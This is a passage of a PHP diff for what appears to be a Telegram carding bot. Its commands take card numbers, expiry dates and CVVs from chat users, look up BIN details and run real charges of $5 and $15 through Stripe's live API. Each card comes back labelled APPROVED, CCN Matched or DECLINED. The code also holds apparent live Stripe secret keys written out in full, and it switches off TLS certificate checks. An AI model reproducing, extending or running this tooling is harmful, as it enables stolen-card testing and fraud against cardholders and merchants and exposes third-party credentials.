+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=500&currency=usd&customer='.$tok2.'');
+        $result3 = curl_exec($ch);
+        $msg3 = Getstr($result3,'"message": "','"');
+        $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+        $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
+        $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
+        if(strpos($result3, '"status": "succeeded"' )) {
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 5$ ✅</b>%0A<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        sendLog ($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 5$ ✅</b>%0A<b>Response -» CHARGED 5$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        return;
+        }
+        if(strpos($result3, "insufficient_funds" )) {
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, "card_error_Chargeentication_required")) || (strpos($result2, "card_error_Chargeentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        }
+        if(strpos($result3,"Your card's security code is incorrect.")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, "fraudulent"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, "expired_card"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, '"decline_code": "generic_decline"'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
             }
+          if ((strpos($result3, "do_not_honor"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'rate_limit'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+            
+          if ((strpos($result3, "Your card was declined."))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» No Account </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, ' "message": "testmode_charges_only"'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'transaction_not_allowed'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Your card does not support this type of purchase. </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'invalid_number'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» NO ACCOUNT ❌</b>%0A<b>Response -» invalid_number </b>%0A<b>Gateway -» Stripe Charge 5$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+
+
+        else {
+          sendMessage($chatId, "<b>SERVER ERROR</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+          sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
+          sendLog($chatId, "<b>BUG REPORTED /chg</b>%0A <b>card:</b><code>$lista</code>%0A<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> %0A%0A<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>%0A%0A<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
+          }
+        }
+///////////========[kcc Command]=========//////////
+ elseif (strpos($message, "/kcc") === 0){
+  $skeys = array(
+      1 => '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', // Enter at least one sk key
+    //2 => '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',-----------------|
+    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
+    //4 => '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',                 |
+    //5 => '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',-----------------|
+    ); 
+    $skey = array_rand($skeys);
+    $sk = $skeys[$skey];
+    $message = substr($message, 4);
+    $amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
+    $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
+    $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
+    $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
+    $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
+        $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
+        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+        'Host: lookup.binlist.net',
+        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
+        $fim = curl_exec($ch);
+        $bank = GetStr($fim, '"bank":{"name":"', '"');
+        $name = GetStr($fim, '"name":"', '"');
+        $brand = GetStr($fim, '"brand":"', '"');
+        $country = GetStr($fim, '"country":{"name":"', '"');
+        $emoji = GetStr($fim, '"emoji":"', '"');
+        $scheme = GetStr($fim, '"scheme":"', '"');
+        $type = GetStr($fim, '"type":"', '"');
+        if(strpos($fim, '"type":"credit"') !== false){
+        $bin = 'Credit';
+        }else{
+        $bin = 'Debit';
+        };
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.' '.$last.'&owner[email]='.$email.'&owner[address][line1]='.$street.'&owner[address][city]='.$city.'&owner[address][state]='.$state.'&owner[address][postal_code]='.$postcode.'&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
+        $result1 = curl_exec($ch);
+        $tok1 = Getstr($result1,'"id": "','"');
+        $msg1 = Getstr($result1,'"message": "','"');
+        if(strpos($result1, "card_error")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "card_declined")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "rate_limit")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "invalid_cvc")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "sources_required_type_param")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "testmode_charges_only")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» SERVER REJECTED ❌</b>%0A<b>Response -» Gate is Dead </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'invalid_expiry_year'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_year </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'invalid_expiry_month'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» EXPRIED CARD ❌</b>%0A<b>Response -» invalid_expiry_month </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, 'incorrect_number'))){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» INVALID CARD ❌</b>%0A<b>Response -» Incorrect number </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$last.'&source='.$tok1.'&address[line1]='.$street.'&address[city]='.$city.'&address[state]='.$state.'&address[postal_code]='.$postcode.'&address[country]=US');
+        $result2 = curl_exec($ch);
+        $tok2 = Getstr($result2,'"id": "','"');
+        $msg2 = Getstr($result2,'"message": "','"');
+        if(strpos($result2, "card_error")){
+          sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "invalid_cvc")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if (strpos($result1, "sources_required_type_param")){
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN ⚠️</b>%0A<b>Response -» Please input card correctly ! </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1500&currency=usd&customer='.$tok2.'');
+        $result3 = curl_exec($ch);
+        $msg3 = Getstr($result3,'"message": "','"');
+        $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+        $rsk = trim(strip_tags(getStr($result3,'"risk_score": "','"')));
+        $rsklv = trim(strip_tags(getStr($result3,'"risk_level": "','"')));
+        if(strpos($result3, '"status": "succeeded"' )) {
+        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 15$ ✅</b>%0A<b>Response -» CHARGED 15$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        sendLog ($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED 15$ ✅</b>%0A<b>Response -» CHARGED 15$ SUCCESSFULLY ✅</b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0A<b>Risk score -» $rsk</b>%0A<b> Risk Level -» $rsklv</b>%0A<b> RECEPIT URL -» $rcp</b>%0a%0a---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        return;
+        }
+        if(strpos($result3, "insufficient_funds" )) {
+          sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» Insufficient Funds </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+          return;
+        }
+        if ((strpos($result3, "card_error_Chargeentication_required")) || (strpos($result2, "card_error_Chargeentication_required"))){ sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APROVED ⚠️</b>%0A<b>Response -» 3D Card </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+        }
+        if(strpos($result3,"Your card's security code is incorrect.")){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ⚠️</b>%0A<b>Response -» CCN Matched </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, "fraudulent"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» REJECTED ⛔</b>%0A<b>Response -» Fraudulent </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, "expired_card"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» expired_card </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, '"decline_code": "generic_decline"'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Generic Declined </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+            }
+          if ((strpos($result3, "do_not_honor"))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+          if ((strpos($result3, 'rate_limit'))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» TRY AGAIN LATER ⚠️</b>%0A<b>Response -» SK is rate limit </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
+            return;
+          }
+            
+          if ((strpos($result3, "Your card was declined."))){
+            sendMessage($chatId, "%0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» Do Not Honor </b>%0A<b>Gateway -» Stripe Charge 15$ </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
